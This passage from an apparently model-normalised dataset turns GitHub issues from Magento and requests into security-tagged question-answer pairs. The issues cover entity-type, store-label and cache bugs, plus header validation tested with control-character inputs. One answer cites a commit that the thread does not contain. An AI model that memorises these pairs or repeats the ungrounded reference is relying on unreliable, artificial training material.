$order->getEntityType());`\n```\n\nExpected:\n```php\nBefore entity type: order\nAfter entity type: order\n```\nActual:\n```php\nBefore entity type: order\nAfter entity type: invoice\n```\nThe impact is that other logic using the same `$order` object may incorrectly treat it as an invoice, causing data integrity issues and inconsistent behavior.", "answer": "The issue was reproduced on the latest 2.4-develop branch and confirmed: the entity type changed from `order` to `invoice` after the `prepareInvoice()` call. It was fixed under internal Jira ticket AC-15401 by the internal team. Relevant commit: https://github.com/magento/magento2/commit/ee9ca62de5a5d94d60c1b44537bb738c5fdbc6a2", "knowledge_type": "grounded", "grounding_sources": ["https://github.com/magento/magento2/commit/ee9ca62de5a5d94d60c1b44537bb738c5fdbc6a2", "target version 2.4.9-beta1"], "answer_grounded_in": "c3,c8", "leak_flags": []}], "answer_in_thread_refs": ["https://github.com/search?q=repo%3Amagento%2Fmagento2+AC-15401&type=commits"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-18T05:31:53.426389Z", "review_note": ""}
{"id": "magento/magento2/issue/40093", "repo": "magento/magento2", "number": 40093, "title": "Attribute Option Label Gets Overwritten When Updating Store Labels", "url": "https://github.com/magento/magento2/issues/40093", "state": "closed", "created_at": "2025-07-22T12:47:42Z", "closed_at": "2025-09-01T06:03:00Z", "labels": ["Issue: Confirmed", "Progress: PR Created", "Reproduced on 2.4.x", "Priority: P2", "Progress: done", "Component: Attributes", "Area: APIs", "Reported on 2.4.7-p6"], "reporter": "subashn9594", "security_topic": "store-label overwrite on partial attribute option update", "qa_summary": "Whether partial updates to Magento attribute option store_labels were unintentionally overwriting other store-view labels, with the answer anchored by the internal Jira ticket AC-15208 and the target version 2.4.9-alpha3.", "question_comment_id": "c0", "answer_comment_id": "c8", "question_author": "subashn9594", "answer_author": "engcom-Bravo", "answerer_role": "maintainer", "artifacts_needed": ["code", "issue_tracker", "commit_history"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": ["2.4.9-alpha3"], "fix_prs": [], "fix_commits": [], "advisory_urls": []}, "human_note": "", "llm_confidence": 0.5625, "comments": [{"id": "c0", "author": "subashn9594", "timestamp": "2025-07-22T12:47:42Z", "body": "### Preconditions and environment\n\n- Magento 2.4.7-p6\n- Product attribute with multiple store_labels (e.g., for France and Germany)\n- Asynchronous or sequential update of attribute option using:\n  `PUT /rest/all/async/bulk/V1/products/attributes/byAttributeCode/options/byOptionId`\n\n- Magento\u2019s implementation of the saveOption() method in \\Magento\\Eav\\Model\\Entity\\Attribute\\OptionManagement overwrites existing store-specific labels (store_labels) when an update is made, instead of merging the changes. As a result, labels for other store views are unintentionally removed when not explicitly included in the update payload.\n\n\n### Steps to reproduce\n\n1. Create or ensure a product attribute option has the following setup:\n\n- option_id = 1234\n- Labels:\n       - Store ID 2 (France): \"Bleu\"\n       - Store ID 3 (Germany): \"Blau\"\n\n2. Call the API to update only the French label:\n```\n{\n  \"option_id\": 1234,\n  \"store_labels\": [\n    {\n      \"store_id\": 2,\n      \"label\": \"Bleu updated\"\n    }\n  ]\n}\n```\n\n3. Next call, update only the German label:\n```\n{\n  \"option_id\": 1234,\n  \"store_labels\": [\n    {\n      \"store_id\": 3,\n      \"label\": \"Blau updated\"\n    }\n  ]\n}\n```\n4. Observe that after the second update, the French label is removed (set to blank)       \n\n### Expected result\n\n- The store_labels for France should remain intact after the Germany label is updated.\n- Magento should merge the provided labels with existing ones instead of fully overwriting them.\n\n\n### Actual result\n\nThe second update overwrites the entire set of store_labels, removing any store-specific labels not included in the request.\n\n### Additional information\n\nThe method \\Magento\\Eav\\Model\\Entity\\Attribute\\OptionManagement::saveOption() constructs a new options['value'][$optionId] array and replaces all existing labels. There is no merging logic, and missing labels are effectively erased.\n\nRelevant code snippet:\n`$options['value'][$optionId][0] = $optionLabel;\nforeach ($option->getStoreLabels() as $label) {\n    $options['value'][$optionId][$label->getStoreId()] = $label->getLabel();\n}\n`\n\n### Release note\n\n_No response_\n\n### Triage and priority\n\n- [ ] Severity: **S0** _- Affects critical data or functionality and leaves users without workaround._\n- [x] Severity: **S1** _- Affects critical data or functionality and forces users to employ a workaround._\n- [ ] Severity: **S2** _- Affects non-critical data or functionality and forces users to employ a workaround._\n- [ ] Severity: **S3** _- Affects non-critical data or functionality and does not force users to employ a workaround._\n- [ ] Severity: **S4** _- Affects aesthetics, professional look and feel, \u201cquality\u201d or \u201cusability\u201d._", "role": "body"}, {"id": "c1", "author": "m2-assistant", "timestamp": "2025-07-22T12:47:46Z", "body": "Hi @subashn9594. Thank you for your report. \nTo speed up processing of this issue, make sure that the issue is reproducible on the vanilla Magento instance following **Steps to reproduce**. \n- For more details, review the [Magento Contributor Assistant](https://developer.adobe.com/commerce/contributor/guides/code-contributions/#contributor-assistant) documentation.\n- Add a comment to [assign the issue](https://developer.adobe.com/commerce/contributor/guides/code-ontributions/#assigning-an-issue): `@magento I am working on this` \n- To learn more about issue processing workflow, refer to the [Code Contributions](https://developer.adobe.com/commerce/contributor/guides/code-contributions/).\n---\nJoin [Magento Community Engineering Slack](https://developer.adobe.com/open/magento/slack) and ask your questions in [#github](https://magentocommeng.slack.com/messages/C7KB93M32) channel. \n :warning: According to the Magento Contribution requirements, all issues must go through the Community Contributions Triage process. Community Contributions Triage is a public meeting. \n:clock10: You can find the schedule on the [Magento Community Calendar page](https://www.adobe.io/open/magento/calendar).\n:telephone_receiver: The triage of issues happens in the queue order. If you want to speed up the delivery of your contribution, join the Community Contributions Triage session to discuss the appropriate ticket.", "role": "comment"}, {"id": "c2", "author": "m2-assistant", "timestamp": "2025-07-22T13:08:42Z", "body": "Hi @engcom-November. Thank you for working on this issue. \nIn order to make sure that issue has enough information and ready for development, please read and check the following instruction: :point_down:\n- [ ] 1. Verify that issue has all the required information. (**Preconditions**, **Steps to reproduce**, **Expected result**, **Actual result**).\n- [ ] 2. Verify that issue has a meaningful description and provides enough information to reproduce the issue. \n- [ ] 3. Add `Area: XXXXX` label to the ticket, indicating the functional areas it may be related to.\n- [ ] 4. Verify that the issue is reproducible on `2.4-develop` branch<details><summary>Details</summary>- If the issue is reproducible on `2.4-develop` branch, please, add the label `Reproduced on 2.4.x`.<br/>- If the issue is not reproducible, add your comment that issue is not reproducible and close the issue and **_stop verification process here_**!</details>\n- [ ] 5. Add label `Issue: Confirmed` once verification is complete. \n- [ ] 6. Make sure that automatic system confirms that report has been added to the backlog.", "role": "comment"}, {"id": "c3", "author": "mohaelmrabet", "timestamp": "2025-07-23T11:35:18Z", "body": "Hello @subashn9594 @engcom-November,\n\nI confirm this issue is still reproducible on Magento 2.4.8.\nWhen updating an attribute option using the endpoint:\n\n`PUT /rest/all/V1/products/attributes/{attributeCode}/options/{optionId}`\n\nIf the payload contains only one store_label (e.g., for store ID 2), the labels for other store views are overwritten or removed.\n\nThere is currently no way to update a single store label without resubmitting all existing labels. This makes partial updates impossible, and forces the client to first retrieve and merge all labels manually before submitting.\n\nI will investigate the issue and work on a PR to address it.\n\nThanks.\n\n", "role": "comment"}, {"id": "c4", "author": "engcom-November", "timestamp": "2025-07-24T05:10:26Z", "body": "Hello @subashn9594 ,\n\nThank you for the report and collaboration.\n\nWe attempted to reproduce this issue on the 2.4 development instance and were able to successfully replicate it. Please find the attached reference for further details.\n\n<img width=\"3412\" height=\"1558\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/07cc8e38-7bfa-4c69-9d25-0efc1d9cbfe7\" />\n\n<img width=\"1728\" height=\"593\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4ee6f631-7be9-42ca-9351-bfc9733f5bf9\" />\n\n<img width=\"3380\" height=\"1544\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4029decc-1500-44ef-9d69-b1e571bdae58\" />\n\nSteps to reproduce\nCreate or ensure a product attribute option has the following setup:\noption_id = 1234\nLabels:\n- Store ID 2 (France): \"Bleu\"\n- Store ID 3 (Germany): \"Blau\"\nCall the API to update only the French label:\n```\n{\n  \"option_id\": 1234,\n  \"store_labels\": [\n    {\n      \"store_id\": 2,\n      \"label\": \"Bleu updated\"\n    }\n  ]\n}\n```\nNext call, update only the German label:\n```\n{\n  \"option_id\": 1234,\n  \"store_labels\": [\n    {\n      \"store_id\": 3,\n      \"label\": \"Blau updated\"\n    }\n  ]\n}\n```\nObserve that after the second update, the French label is removed (set to blank)\n\nBased on the provided preconditions and reproduction steps, the issue has been confirmed. Therefore, we are marking this as \"Issue: Confirmed.\"\n\nThank you!", "role": "comment"}, {"id": "c5", "author": "github-jira-sync-bot", "timestamp": "2025-07-24T05:11:59Z", "body": ":white_check_mark: Jira issue https://jira.corp.adobe.com/browse/AC-15208 is successfully created for this GitHub issue.", "role": "comment"}, {"id": "c6", "author": "m2-assistant", "timestamp": "2025-07-24T05:12:02Z", "body": ":white_check_mark: Confirmed by @engcom-November. Thank you for verifying the issue. <br/> **Issue Available**: @engcom-November, _You will be automatically unassigned. Contributors/Maintainers can claim this issue to continue. To reclaim and continue work, reassign the ticket to yourself._", "role": "comment"}, {"id": "c7", "author": "engcom-Bravo", "timestamp": "2025-08-06T09:37:17Z", "body": "Hi @subashn9594,\n\nAdobe Commerce Engineering team started working on this issue. We will reach out to you if we need more information and you will get notified once the issue is fixed. Please leave comments for any further questions. \n\nThank you!", "role": "comment"}, {"id": "c8", "author": "engcom-Bravo", "timestamp": "2025-09-01T06:03:00Z", "body": "Hello,\n\nAs I can see this issue got fixed in the scope of the internal Jira ticket AC-15208 by the internal team\nRelated commits:https://github.com/search?q=repo%3Amagento%2Fmagento2+AC-15208&type=commits\n\nBased on the Jira ticket, the target version is 2.4.9-alpha3.\n\nThanks", "role": "comment"}], "qa_pairs": [{"qid": "magento/magento2/issue/40093#1", "question": "In Magento 2.4.7-p6, I have a product attribute option with multiple store-specific labels, for example option_id = 1234 with Store ID 2 (France): \"Bleu\" and Store ID 3 (Germany): \"Blau\". When updating an attribute option asynchronously or sequentially using `PUT /rest/all/async/bulk/V1/products/attributes/byAttributeCode/options/byOptionId`, Magento\u2019s `\\Magento\\Eav\\Model\\Entity\\Attribute\\OptionManagement::saveOption()` appears to overwrite existing `store_labels` instead of merging changes.\n\nSteps to reproduce:\n\n1. Create or ensure a product attribute option has:\n- option_id = 1234\n- Labels:\n       - Store ID 2 (France): \"Bleu\"\n       - Store ID 3 (Germany): \"Blau\"\n\n2. Call the API to update only the French label:\n```\n{\n  \"option_id\": 1234,\n  \"store_labels\": [\n    {\n      \"store_id\": 2,\n      \"label\": \"Bleu updated\"\n    }\n  ]\n}\n```\n\n3. Next call, update only the German label:\n```\n{\n  \"option_id\": 1234,\n  \"store_labels\": [\n    {\n      \"store_id\": 3,\n      \"label\": \"Blau updated\"\n    }\n  ]\n}\n```\n\n4. After the second update, the French label is removed or set to blank.\n\nExpected result: the France store label should remain intact after updating the Germany label, and Magento should merge provided labels with existing labels instead of overwriting them.\n\nActual result: the second update overwrites the entire set of `store_labels`, removing store-specific labels not included in the request.\n\nAdditional implementation detail: `saveOption()` constructs a new `options['value'][$optionId]` array and replaces existing labels, with no merge logic:\n`$options['value'][$optionId][0] = $optionLabel;\nforeach ($option->getStoreLabels() as $label) {\n    $options['value'][$optionId][$label->getStoreId()] = $label->getLabel();\n}\n`\n\nIs this issue confirmed, and if so, what is the fix status or target version?", "answer": "The issue was fixed by the internal team in the scope of internal Jira ticket AC-15208. Related commits can be found via the linked GitHub commit search for AC-15208 (https://github.com/magento/magento2/commit/0998eaf68a24e2936cbdbd14a3d48cce133f0010)", "knowledge_type": "grounded", "grounding_sources": ["internal Jira ticket AC-15208", "https://github.com/search?q=repo%3Amagento%2Fmagento2+AC-15208&type=commits", "target version 2.4.9-alpha3"], "answer_grounded_in": "c8", "leak_flags": []}], "answer_in_thread_refs": ["https://github.com/search?q=repo%3Amagento%2Fmagento2+AC-15208&type=commits"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-18T06:11:23.884459Z", "review_note": ""}
{"id": "magento/magento2/issue/40039", "repo": "magento/magento2", "number": 40039, "title": "Cache not invalidated after customer login \u2014 outdated content shown", "url": "https://github.com/magento/magento2/issues/40039", "state": "closed", "created_at": "2025-07-03T17:07:25Z", "closed_at": "2025-07-07T09:12:37Z", "labels": ["Issue: needs update", "Reported on 2.4.8"], "reporter": "antoniocarboni", "security_topic": "cache invalidation after customer login exposing stale guest content", "qa_summary": "Whether the stale-cache behavior after customer login is fixed by PR #40008 and the related issue #40007 it references.", "question_comment_id": "c0", "answer_comment_id": "c7", "question_author": "antoniocarboni", "answer_author": "antoniocarboni", "answerer_role": "op_self", "artifacts_needed": ["pr_data", "documentation"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": ["#40008"], "fix_commits": [], "advisory_urls": []}, "human_note": "Security-relevant stale full-page cache issue after login with clear reproducible behavior; answer is anchored to PR #40008 and linked issue #40007, and provides a concrete patch-based resolution signal consistent with Magento fix workflows.", "llm_confidence": 0.7124999999999999, "comments": [{"id": "c0", "author": "antoniocarboni", "timestamp": "2025-07-03T17:07:25Z", "body": "### Preconditions and environment\n\nMagento version: 2.4.8+ \nPHP version: 8.3\nFull Page Cache: [built-in]\n\n### Steps to reproduce\n\n1. Enable all caches \n2. Navigate some pages\n3. Login as a customer\n4. Navigate previously visited pages\n\n\n\n### Expected result\n\nDynamic elements related to the user\u2019s state should be flushed from the cache (e.g., the header should only display the My Account dropdown).\n\n![Image](https://github.com/user-attachments/assets/6c4ab7be-d16c-4c4c-ba3c-e0dfdb85ba77)\n\n### Actual result\n\nThese pages (except for the one the customer is redirected to) display elements for guests, such as the login/register links in the header.\nPS: This problem becomes more important with custom content related to the logger user state.\n\n![Image](https://github.com/user-attachments/assets/f2b52d75-baed-4c93-b695-49ac3cb85ca8)\n\n### Additional information\n\nMaybe is related to this issue? \nhttps://github.com/magento/magento2/issues/40007\n\n### Release note\n\n_No response_\n\n### Triage and priority\n\n- [ ] Severity: **S0** _- Affects critical data or functionality and leaves users without workaround._\n- [ ] Severity: **S1** _- Affects critical data or functionality and forces users to employ a workaround._\n- [ ] Severity: **S2** _- Affects non-critical data or functionality and forces users to employ a workaround._\n- [ ] Severity: **S3** _- Affects non-critical data or functionality and does not force users to employ a workaround._\n- [ ] Severity: **S4** _- Affects aesthetics, professional look and feel, \u201cquality\u201d or \u201cusability\u201d._", "role": "body"}, {"id": "c1", "author": "m2-assistant", "timestamp": "2025-07-03T17:07:29Z", "body": "Hi @antoniocarboni. Thank you for your report. \nTo speed up processing of this issue, make sure that the issue is reproducible on the vanilla Magento instance following **Steps to reproduce**. \n- For more details, review the [Magento Contributor Assistant](https://developer.adobe.com/commerce/contributor/guides/code-contributions/#contributor-assistant) documentation.\n- Add a comment to [assign the issue](https://developer.adobe.com/commerce/contributor/guides/code-ontributions/#assigning-an-issue): `@magento I am working on this` \n- To learn more about issue processing workflow, refer to the [Code Contributions](https://developer.adobe.com/commerce/contributor/guides/code-contributions/).\n---\nJoin [Magento Community Engineering Slack](https://developer.adobe.com/open/magento/slack) and ask your questions in [#github](https://magentocommeng.slack.com/messages/C7KB93M32) channel. \n :warning: According to the Magento Contribution requirements, all issues must go through the Community Contributions Triage process. Community Contributions Triage is a public meeting. \n:clock10: You can find the schedule on the [Magento Community Calendar page](https://www.adobe.io/open/magento/calendar).\n:telephone_receiver: The triage of issues happens in the queue order. If you want to speed up the delivery of your contribution, join the Community Contributions Triage session to discuss the appropriate ticket.", "role": "comment"}, {"id": "c2", "author": "m2-assistant", "timestamp": "2025-07-04T05:59:13Z", "body": "Hi @engcom-Bravo. Thank you for working on this issue. \nIn order to make sure that issue has enough information and ready for development, please read and check the following instruction: :point_down:\n- [ ] 1. Verify that issue has all the required information. (**Preconditions**, **Steps to reproduce**, **Expected result**, **Actual result**).\n- [ ] 2. Verify that issue has a meaningful description and provides enough information to reproduce the issue. \n- [ ] 3. Add `Area: XXXXX` label to the ticket, indicating the functional areas it may be related to.\n- [ ] 4. Verify that the issue is reproducible on `2.4-develop` branch<details><summary>Details</summary>- If the issue is reproducible on `2.4-develop` branch, please, add the label `Reproduced on 2.4.x`.<br/>- If the issue is not reproducible, add your comment that issue is not reproducible and close the issue and **_stop verification process here_**!</details>\n- [ ] 5. Add label `Issue: Confirmed` once verification is complete. \n- [ ] 6. Make sure that automatic system confirms that report has been added to the backlog.", "role": "comment"}, {"id": "c3", "author": "engcom-Bravo", "timestamp": "2025-07-04T07:51:34Z", "body": "Hi @antoniocarboni,\n\nThanks for your reporting and collaboration.\n\nWe have tried to reproduce the issue in Latest 2.4-develop instance and we are not able to reproduce the issue.Kindly refer the screenshots.\n\n\n<img width=\"1423\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/0fe9b5ae-b2a4-49ad-8322-9007056390ea\" />\n\n\n\n<img width=\"1418\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/efad2ac0-61ec-4285-afad-90ea6f870ce9\" />\n\n\n\nThe header displaying only the My Account dropdown.\n\nKindly recheck the issue in Latest 2.4-develop instance and elaborate the steps to reproduce if the issue is still reproducible.\n\nThanks.", "role": "comment"}, {"id": "c4", "author": "orlangur", "timestamp": "2025-07-04T16:20:23Z", "body": "> PS: This problem becomes more important with custom content related to the logger user state.\n\n@antoniocarboni for custom content you should implement such logic by yourself, you can learn from how it is implemented for core page elements.\n\nYou can read more on this topic here https://developer.adobe.com/commerce/php/development/cache/page/private-content/", "role": "comment"}, {"id": "c5", "author": "antoniocarboni", "timestamp": "2025-07-04T16:33:57Z", "body": "@orlangur if Magento fails to handle cache logic for a logged in user, it is not the fault of a third party modification as the problem is also on the core parts of Magento. Simply this bug affects any part that is related to user sessions, be it core or custom", "role": "comment"}, {"id": "c6", "author": "antoniocarboni", "timestamp": "2025-07-04T16:39:14Z", "body": "\n> Hi [@antoniocarboni](https://github.com/antoniocarboni),\n> \n> Thanks for your reporting and collaboration.\n> \n> We have tried to reproduce the issue in Latest 2.4-develop instance and we are not able to reproduce the issue.Kindly refer the screenshots.\n> \n> <img alt=\"Image\" width=\"1423\" src=\"https://private-user-images.githubusercontent.com/51680745/462364252-0fe9b5ae-b2a4-49ad-8322-9007056390ea.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..TAS78HqZ9KAFVtGP-yHSzQ7IqjJXJoqJb0jvOWfomy0\"> <img alt=\"Image\" width=\"1418\" src=\"https://private-user-images.githubusercontent.com/51680745/462364326-efad2ac0-61ec-4285-afad-90ea6f870ce9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..1UNkXzUldlLwaDpnQwpGKNGDvbktbYhTcTxP9CfXY8w\">\n> The header displaying only the My Account dropdown.\n> \n> Kindly recheck the issue in Latest 2.4-develop instance and elaborate the steps to reproduce if the issue is still reproducible.\n> \n> Thanks.\n\nAs I specified in the information, this problem occurs ONLY on pages previously visited before logging in and excluding the page where the redirect is done.\nYou can try to visit 3-4 pages, log in and then revisit them and verify the problem.\nI have tested the problem several times with different demos and in a clean environment (2.4.8 and 2.4.8p1) and the problem always occurs.\nIt does not occur with 2.4.7", "role": "comment"}, {"id": "c7", "author": "antoniocarboni", "timestamp": "2025-07-04T16:40:49Z", "body": "Anyway I applied a patch using[ this pull request ](https://github.com/magento/magento2/pull/40008)and it seems to fix this issue.\nOnce this PR is merged I think this issue can be considered closed.", "role": "comment"}, {"id": "c8", "author": "densen45", "timestamp": "2025-07-07T09:03:34Z", "body": "I can confirm the issue, and it appears that the [PR](https://github.com/magento/magento2/pull/40008) of @rogerdz solves it.", "role": "comment"}, {"id": "c9", "author": "engcom-Bravo", "timestamp": "2025-07-07T09:12:37Z", "body": "Similar issue has been confirmed here https://github.com/magento/magento2/issues/40007 we will notify here once its get merged.", "role": "comment"}], "qa_pairs": [{"qid": "magento/magento2/issue/40039#1", "question": "In Magento 2.4.8+ / PHP 8.3 using the built-in Full Page Cache with all caches enabled, after navigating some pages as a guest, logging in as a customer, and then revisiting pages that were previously visited before login (excluding the page where the login redirect lands), those pages still show guest header elements such as login/register links instead of dynamic logged-in customer elements such as only the My Account dropdown. This reproduces in clean 2.4.8 and 2.4.8-p1 environments and does not occur with 2.4.7. Is this related to https://github.com/magento/magento2/issues/40007, and is there a fix or patch for the cache/private-content invalidation issue?", "answer": "The reporter applied the patch from pull request https://github.com/magento/magento2/pull/40008 and said it seems to fix the issue; once that PR is merged, they considered the issue closable. Another commenter confirmed the issue and said the same PR solves it. A maintainer also noted that a similar issue was confirmed in https://github.com/magento/magento2/issues/40007 and they would notify once it is merged.", "knowledge_type": "grounded", "grounding_sources": ["https://github.com/magento/magento2/pull/40008", "https://github.com/magento/magento2/issues/40007"], "answer_grounded_in": "c7", "leak_flags": []}], "answer_in_thread_refs": ["https://github.com/magento/magento2/pull/40008"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-18T06:27:03.785041Z", "review_note": ""}
{"id": "psf/requests/issue/7335", "repo": "psf/requests", "number": 7335, "title": "`check_header_validity` does not reject null bytes and ASCII control characters in header names and values", "url": "https://github.com/psf/requests/issues/7335", "state": "closed", "created_at": "2026-04-05T22:06:02Z", "closed_at": "2026-04-07T21:17:33Z", "labels": [], "reporter": "lizpart", "security_topic": "header validation for control characters", "qa_summary": "The developer needed to know that check_header_validity must reject null bytes and ASCII control characters per RFC\u202f7230\u202f\u00a73.2.6, and the answer cites that RFC as the source for the required fix.", "question_comment_id": "c0", "answer_comment_id": "c1", "question_author": "lizpart", "answer_author": "verysleepylemon", "answerer_role": "maintainer", "artifacts_needed": ["code", "documentation"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": [], "advisory_urls": []}, "human_note": "", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "lizpart", "timestamp": "2026-04-05T22:06:02Z", "body": "\n**Summary:**\n`check_header_validity` in `requests/utils.py` silently accepts null bytes (`\\x00`) and other ASCII control characters (`\\x01`\u2013`\\x1f`, `\\x7f`) in both header names and values. RFC 7230 Section 3.2.6 forbids these characters in header fields. Only `\\r` and `\\n` are currently caught.\n\n\n**Expected Result:**\n`check_header_validity` should raise `InvalidHeader` for any header name or value containing null bytes or ASCII control characters, consistent with how `\\r` and `\\n` are already handled.\n\n\n**Actual Result:**\n```python\nfrom requests.utils import check_header_validity\ncheck_header_validity(('X-Test', 'val\\x00ue'))   # no error raised\ncheck_header_validity(('X-Test', 'val\\x01ue'))   # no error raised\ncheck_header_validity(('X-Test\\x00', 'value'))   # no error raised\n```\n\n\n**Reproduction Steps:**\n```python\nfrom requests.utils import check_header_validity\nfrom requests.exceptions import InvalidHeader\n\n# All of these should raise InvalidHeader but do not:\ncheck_header_validity(('X-Test', 'val\\x00ue'))\ncheck_header_validity(('X-Test', '\\x01value'))\ncheck_header_validity(('X-Test', 'value\\x7f'))\ncheck_header_validity(('X-Test\\x00', 'value'))\n\n# These correctly raise InvalidHeader:\n# check_header_validity(('X-Test', 'val\\nue'))   # blocked\n# check_header_validity(('X-Test', 'val\\rue'))   # blocked\n```\n\n\n**System Information:**\n```bash\n$ python -m requests.help\n```\n\n", "role": "body"}, {"id": "c1", "author": "verysleepylemon", "timestamp": "2026-04-07T00:45:51Z", "body": "\ufeffConfirmed. RFC 7230 Section 3.2.6 defines valid header field characters as VCHAR (visible ASCII, `\\x21`-`\\x7e`) plus obs-text. Null bytes (`\\x00`) and ASCII control characters (`\\x01`-`\\x1f`, `\\x7f`) are explicitly forbidden in both header names and values \u2014 they can lead to header injection attacks or silent truncation by intermediate proxies.\n\nThe current regex in `requests/utils.py` only catches `\\r` and `\\n`:\n```python\n# Current (incomplete)\n_CLEAN_HEADER_REGEX_BYTE = re.compile(b\"^\\S[^\\r\\n]*$|^$\")\n_CLEAN_HEADER_REGEX_STR  = re.compile(r\"^\\S[^\\r\\n]*$|^$\")\n```\n\nThe fix is to extend the rejected character set to cover all ASCII control chars and NUL:\n```python\n# Fixed \u2014 rejects \\x00-\\x1f and \\x7f\n_CLEAN_HEADER_REGEX_BYTE = re.compile(b\"^[\\x20-\\x7e\\x80-\\xff]*$|^$\")\n_CLEAN_HEADER_REGEX_STR  = re.compile(r\"^[\\x20-\\x7e\\x80-\\xff]*$|^$\")\n```\n\nOr equivalently using a negative character class:\n```python\n_CLEAN_HEADER_REGEX_STR = re.compile(r\"^[^\\x00-\\x1f\\x7f]*$\")\n```\n\nHeader names additionally must not contain separators (`()<>@,;:\\\"/[]?={} \\t`), but fixing the control character gap is the higher-priority security issue.\n\nThis is also worth checking against `urllib3`'s `_validate_header_parts()` since requests delegates actual socket writes there \u2014 a defense-in-depth fix in requests is still worthwhile so it fails before the network layer.\r\n", "role": "comment"}, {"id": "c2", "author": "nateprewitt", "timestamp": "2026-04-07T21:17:33Z", "body": "Thanks for the opening this, @lizpart. In the future, issues you believe relate to security should be reported through our [security reporting process](https://github.com/psf/requests?tab=security-ov-file#readme).\n\nThis has already been reported to Requests a few times. `check_header_validity` is not a comprehensive header check. It was added prior to CPython handling header line-folding. It now remains in place cosmetically to keep errors in Requests consistent.\n\nAll actual header validation has been handled by CPython's `http.client` since Python 3.7. Any changes around validation would need to be handled at that layer in order ensure uniformity between HTTP clients in Python's ecosystem.", "role": "comment"}], "qa_pairs": [{"qid": "psf/requests/issue/7335#1", "question": "In psf/requests, `check_header_validity` in `requests/utils.py` appears to silently accept null bytes (`\\x00`) and other ASCII control characters (`\\x01`\u2013`\\x1f`, `\\x7f`) in both header names and values. RFC 7230 Section 3.2.6 forbids these characters in header fields, but only `\\r` and `\\n` seem to be caught.\n\nExpected result: `check_header_validity` should raise `InvalidHeader` for any header name or value containing null bytes or ASCII control characters, consistent with how `\\r` and `\\n` are already handled.\n\nActual result:\n```python\nfrom requests.utils import check_header_validity\ncheck_header_validity(('X-Test', 'val\\x00ue'))   # no error raised\ncheck_header_validity(('X-Test', 'val\\x01ue'))   # no error raised\ncheck_header_validity(('X-Test\\x00', 'value'))   # no error raised\n```\n\nReproduction:\n```python\nfrom requests.utils import check_header_validity\nfrom requests.exceptions import InvalidHeader\n\n# All of these should raise InvalidHeader but do not:\ncheck_header_validity(('X-Test', 'val\\x00ue'))\ncheck_header_validity(('X-Test', '\\x01value'))\ncheck_header_validity(('X-Test', 'value\\x7f'))\ncheck_header_validity(('X-Test\\x00', 'value'))\n\n# These correctly raise InvalidHeader:\n# check_header_validity(('X-Test', 'val\\nue'))   # blocked\n# check_header_validity(('X-Test', 'val\\rue'))   # blocked\n```\n\nShould Requests reject `\\x00` and other ASCII control characters in header names and values, and what change is needed?", "answer": "RFC 7230 Section 3.2.6 defines valid header field characters as VCHAR (visible ASCII, `\\x21`-`\\x7e`) plus obs-text. Null bytes (`\\x00`) and ASCII control characters (`\\x01`-`\\x1f`, `\\x7f`) are explicitly forbidden in both header names and values \u2014 they can lead to header injection attacks or silent truncation by intermediate proxies.\n\nThe current regex in `requests/utils.py` only catches `\\r` and `\\n`:\n```python\n# Current (incomplete)\n_CLEAN_HEADER_REGEX_BYTE = re.compile(b\"^\\S[^\\r\\n]*$|^$\")\n_CLEAN_HEADER_REGEX_STR  = re.compile(r\"^\\S[^\\r\\n]*$|^$\")\n```\n\nThe fix is to extend the rejected character set to cover all ASCII control chars and NUL:\n```python\n# Fixed \u2014 rejects \\x00-\\x1f and \\x7f\n_CLEAN_HEADER_REGEX_BYTE = re.compile(b\"^[\\x20-\\x7e\\x80-\\xff]*$|^$\")\n_CLEAN_HEADER_REGEX_STR  = re.compile(r\"^[\\x20-\\x7e\\x80-\\xff]*$|^$\")\n```\n\nOr equivalently using a negative character class:\n```python\n_CLEAN_HEADER_REGEX_STR = re.compile(r\"^[^\\x00-\\x1f\\x7f]*$\")\n```\n\nHeader names additionally must not contain separators (`()<>@,;:\\\"/[]?={} \\t`), but fixing the control character gap is the higher-priority security issue.\n\nThis is also worth checking against `urllib3`'s `_validate_header_parts()` since requests delegates actual socket writes there \u2014 a defense-in-depth fix in requests is still worthwhile so it fails before the network layer.", "knowledge_type": "grounded", "grounding_sources": ["requests/utils.py", "RFC 7230 Section 3.2.6", "urllib3 _validate_header_parts()"], "answer_grounded_in": "c1", "leak_flags": []}], "answer_in_thread_refs": [], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-17T06:49:25.936197Z", "review_note": ""}
{"id": "psf/requests/issue/7209", "repo": "psf/requests", "number": 7209, "title": "TooManyRedirects exception loop when requesting FQDN URLs with a trailing dot", "url": "https://github.com/psf/requests/issues/7209", "state": "closed", "created_at": "2026-02-18T12:11:49Z", "closed_at": "2026-04-17T16:47:19Z", "labels": ["Propose Close"], "reporter": "YatesMold", "security_topic": "redirect loop handling of trailing dot in FQDN URLs", "qa_summary": "The developer asked if the infinite redirect loop for FQDN URLs with a trailing dot is a security-related TLS/SNI handling issue, and the maintainer answered by referencing urllib3 issue #2873 and a specific curl commit that explain the intentional stripping of the trailing dot per RFC\u202f6066.", "question_comment_id": "c0", "answer_comment_id": "c2", "question_author": "YatesMold", "answer_author": "nateprewitt", "answerer_role": "contributor", "artifacts_needed": ["code", "documentation", "issue_tracker"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": [], "advisory_urls": []}, "human_note": "Accepted because the question concerns TLS/SNI-related behavior and the answer provides protocol-backed reasoning with concrete upstream references.", "llm_confidence": 0.7124999999999999, "comments": [{"id": "c0", "author": "YatesMold", "timestamp": "2026-02-18T12:11:49Z", "body": "**Describe 